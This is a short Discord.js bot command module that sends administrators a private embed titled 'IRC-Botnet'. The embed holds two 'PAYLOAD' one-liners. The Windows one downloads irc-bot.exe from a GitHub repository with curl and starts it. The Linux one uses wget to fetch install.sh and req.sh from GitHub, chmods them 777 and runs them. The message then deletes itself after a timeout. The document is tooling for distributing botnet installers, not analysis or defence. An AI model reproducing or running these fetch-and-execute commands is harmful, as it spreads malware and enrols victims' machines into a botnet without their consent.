const Discord   = require("discord.js");

module.exports = async (client,msg,channel,member) =>{msg.delete();
  if(!msg.member.permissions.has("ADMINISTRATOR")) {
    return msg.member.send("**Acess Denied. :lock:**").then(msg => msg.delete({timeout: 5000}))
  }

    let emoji = await msg.guild.emojis.cache.find(emoji => emoji.name === "fix");
    let embed = await new Discord.MessageEmbed()
    .setColor("#000000")
    .setTitle(`${emoji} **IRC-Botnet:**`)
    .setDescription(`
        **PAYLOAD - Windows**
        \`\`\`curl https://github.com/Paulo0819/irc-windows/raw/main/irc-bot.exe > irc-bot.exe && start irc-bot.exe\`\`\`
        **PAYLOAD - Linux**
        \`\`\`wget https://raw.githubusercontent.com/Paulo0819/irc-linux/main/install.sh && wget https://raw.githubusercontent.com/Paulo0819/irc-linux/main/req.sh && chmod 777 req.sh && ./req.sh && chmod 777 install.sh && ./install.sh\`\`\`
        `)

  msg.member.send(embed).then(msg => msg.delete({timeout: 50000}))
}